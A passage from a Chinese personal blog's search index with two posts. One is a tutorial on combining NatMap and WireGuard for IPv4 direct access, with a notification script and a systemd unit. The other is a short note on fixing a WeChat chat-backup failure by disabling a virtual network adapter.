<h4 id="NatMap"><a href="#NatMap" class="headerlink" title="NatMap"></a>NatMap</h4><p>NATMap实现与拥有动态公网IP同等的访问效果，它通过打通完全锥型(Full cone)类型NAT的TCP、UDP端口，实现访问侧任意主机在无需客户端的情况下进行直连访问。</p>
<p><a href="https://github.com/heiher/natmap">https://github.com/heiher/natmap</a></p>
<p>再使用前可以先阅读官方文档，理解其原理，本文更偏向于实践。与作者方案的不同之处是，笔者并不使用作者的IP4P方法，因为笔者手机是IOS，作者的提供WireGuard分支只支持安卓，也不支持Windows。</p>
<p>NatMap成功后会返回公网IP和端口，所以笔者的方案是通过server酱把成功后的IP和端口发送到微信，然后在客户端手动修改WireGuard配置，没有什么高深技术，只是记录配置过程，所以大神可以省流。</p>
<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>首先配置好WireGuard服务，如果还没配置好请搜索相关教程，可以看看司博图的，配置起来非常简单，不再赘述。<br><img data-src="/2024/06/08/NatMap-IPv4%E7%9B%B4%E8%BF%9E%E6%96%B9%E6%A1%88/2024-06-08-22-55-16.png"></p>
<p>其实作者也写了文档，可以看作者的。</p>
<p>然后是调试natmap，通过下面命令启动natmap，当然不使用su命令也行，个人习惯，能不给root就不给。其中-p是WireGuard的端口，因为跟WireGuard是同一台服务器，所以-t是127.0.0.1，如果不是可以写其它内网地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su nobody -m -p -c <span class="string">&quot;./natmap-linux-x86_64 -u -s turn.cloudflare.com -t 127.0.0.1 -p 5xxx&quot;</span></span><br></pre></td></tr></table></figure>
<p>运行后一段时间，成功的话有类似以下的输出，第一个的你的公网出口IP，第二个是映射的端口，我们主要关注这两个。第三个是作者提出的IP4P地址，可参考作者文档。<br><img data-src="/2024/06/08/NatMap-IPv4%E7%9B%B4%E8%BF%9E%E6%96%B9%E6%A1%88/2024-06-08-23-01-32.png"></p>
<p>此时使用手机或者其它设备通过WireGuard连接，可以连接成功。</p>
<p>注册Server酱或者PushDeer，这里推荐PushDeer，实测Server酱免费用户只能每天发5条，PushDeer则无限制。</p>
<p>Server酱：<br><a href="https://sct.ftqq.com/">https://sct.ftqq.com/</a><br>PushDeer：<br><a href="https://github.com/easychen/pushdeer">https://github.com/easychen/pushdeer</a></p>
<h4 id="编写通知脚本"><a href="#编写通知脚本" class="headerlink" title="编写通知脚本"></a>编写通知脚本</h4><p>作者提供了<code>-e</code>参数供用户调用脚本进行ddns更新，但有个坑点是只支持调用sh脚本，这方面缺少文档。</p>
<p>先创建文件存放目录及文件，注意不要放在/root目录和/home目录，大概率出现权限问题，因为后面自启动是通过nobody用户运行的，权限很低。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /tools</span><br><span class="line"><span class="built_in">cd</span> /tools</span><br><span class="line"></span><br><span class="line">touch ddns.sh</span><br><span class="line">touch natmap-ddns.py</span><br></pre></td></tr></table></figure>

<p>ddns.sh内容如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/usr/bin/python3.9 /tools/natmap-ddns.py $*</span><br></pre></td></tr></table></figure>

<p>natmap-ddns.py内容如下，根据自己的通知方式修改apikey或者pushkey：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug su nobody -m -p -c &quot;./natmap-linux-x86_64 -u -s turn.cloudflare.com -t 127.0.0.1 -p 5xxx -e \&quot;/tools/natmap-ddns.py\&quot;&quot;</span></span><br><span class="line">ip4 = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = sys.argv[<span class="number">2</span>]</span><br><span class="line">ip4p = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">localport = sys.argv[<span class="number">4</span>]</span><br><span class="line">ttype = sys.argv[<span class="number">5</span>]</span><br><span class="line">localip = sys.argv[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pubaddr = <span class="string">f&#x27;<span class="subst">&#123;ip4&#125;</span>:<span class="subst">&#123;port&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msg = <span class="string">f&#x27;[+] Public: <span class="subst">&#123;pubaddr&#125;</span>    Local: <span class="subst">&#123;localip&#125;</span>:<span class="subst">&#123;localport&#125;</span>    type: <span class="subst">&#123;ttype&#125;</span>&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send to serverChan</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_to_serverchan</span>(<span class="params">pubaddr</span>):</span></span><br><span class="line">    apikey = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    url = <span class="string">f&#x27;https://sctapi.ftqq.com/<span class="subst">&#123;apikey&#125;</span>.send?title=NatMap&amp;desp=<span class="subst">&#123;pubaddr&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = urllib.request.urlopen(url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Send: Server酱消息发送成功！&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Error: Server酱消息发送错误！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_to_pushdeer</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="comment"># https://api2.pushdeer.com/message/push?pushkey=key&amp;text=要发送的内容</span></span><br><span class="line">    pushkey = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    url = <span class="string">f&#x27;https://api2.pushdeer.com/message/push?pushkey=<span class="subst">&#123;pushkey&#125;</span>&amp;text=<span class="subst">&#123;msg&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = urllib.request.urlopen(url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Send: PushDeer消息发送成功！&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Error: PushDeer消息发送错误！&#x27;</span>)</span><br><span class="line"></span><br><span class="line">msg = urllib.parse.quote(msg)</span><br><span class="line">send_to_pushdeer(msg)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="配置自启动服务"><a href="#配置自启动服务" class="headerlink" title="配置自启动服务"></a>配置自启动服务</h4><p>通过systemd启动，适用于大部分的Linux系统，如Ubuntu、CentOS等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch /etc/systemd/system/natmap.service</span><br></pre></td></tr></table></figure>

<p>natmap.service内容如下，其中ExecStart修改为自己调试好的命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;NatMap Service</span><br><span class="line">Documentation&#x3D;NatMap Service</span><br><span class="line">After&#x3D;network.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User&#x3D;nobody</span><br><span class="line">CapabilityBoundingSet&#x3D;CAP_NET_ADMIN CAP_NET_BIND_SERVICE</span><br><span class="line">AmbientCapabilities&#x3D;CAP_NET_ADMIN CAP_NET_BIND_SERVICE</span><br><span class="line">NoNewPrivileges&#x3D;true</span><br><span class="line">ExecStart&#x3D;&#x2F;tools&#x2F;natmap-linux-x86_64 -u -s turn.cloudflare.com -t 127.0.0.1 -p 5xxxx -e &#x2F;tools&#x2F;ddns.sh</span><br><span class="line">Restart&#x3D;on-failure</span><br><span class="line">RestartPreventExitStatus&#x3D;23</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>

<p>设置natmap服务自启动，并启动服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl <span class="built_in">enable</span> natmap.service</span><br><span class="line">systemctl start natmap.service</span><br></pre></td></tr></table></figure>

<p>然后微信（Server酱）或者PushDeer就收到IP地址啦，配置到WireGuard连接即可。<br><img data-src="/2024/06/08/NatMap-IPv4%E7%9B%B4%E8%BF%9E%E6%96%B9%E6%A1%88/2024-06-08-23-23-11.png"></p>
<p><img data-src="/2024/06/08/NatMap-IPv4%E7%9B%B4%E8%BF%9E%E6%96%B9%E6%A1%88/2024-06-08-23-23-37.png"></p>
<p><img data-src="/2024/06/08/NatMap-IPv4%E7%9B%B4%E8%BF%9E%E6%96%B9%E6%A1%88/2024-06-08-23-34-25.png"></p>
<p><img data-src="/2024/06/08/NatMap-IPv4%E7%9B%B4%E8%BF%9E%E6%96%B9%E6%A1%88/2024-06-09-09-55-59.png"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>本方案或许还不够优雅，也是无奈之举，希望有更多支持IP4P格式的应用，如Windows的WireGuard支持，那么就可以实现自动化的WireGuard连接了，当然，或许可以考虑tailscale。至于笔者为什么不直接使用tailscale？可以说是洁癖吧，不喜欢自己的内网通过公网的服务商进行接入，headscale配置又很复杂，感觉没啥必要，毕竟平时都是同IPv6连接，额外增加那么多资源去配置headscale似乎很不优雅，natmap正好补充了这方面的不足。</p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>微信聊天记录备份失败</title>
    <url>/2024/11/04/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%A4%87%E4%BB%BD%E5%A4%B1%E8%B4%A5/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>想备份一下微信的聊天记录，一直提示<code>当前网络状况复杂，请尝试使用其它网络</code>，想着可能是防火墙拦截了，给开放下端口就行，然后防火墙添加微信的入站规则，还不行，然后火绒剑分析一下端口，发现事情没有那么简单。。。<br><img data-src="/2024/11/04/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%A4%87%E4%BB%BD%E5%A4%B1%E8%B4%A5/2024-11-04-10-32-37.png"></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>打开火绒剑看一下微信进程监听的网络端口，很容易判断出<code>8000</code>端口是微信的备份服务监听端口（下图是正在备份中，所以有建立TCP连接）。可以看到微信会抓取本地某个网卡的ip，比如<code>192.168.1.2</code>来进行监听，而不是<code>0.0.0.0</code>，导致监听的ip不对，无法进行通信，那么解决的方法也很简单，就是把其它网卡先禁用掉，备份完再启用。<br><img data-src="/2024/11/04/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%A4%87%E4%BB%BD%E5%A4%B1%E8%B4%A5/2024-11-04-10-34-33.png"></p>
<p>因为我看到它是监听了vm8的端口，所以把vm8禁用了就可以正常备份了。<br><img data-src="/2024/11/04/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%A4%87%E4%BB%BD%E5%A4%B1%E8%B4%A5/2024-11-04-10-38-35.png"></p>
<p>明明只要获取全部网卡ip地址逐个尝试连接就可以了，非不把功能做好。</p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
</search>
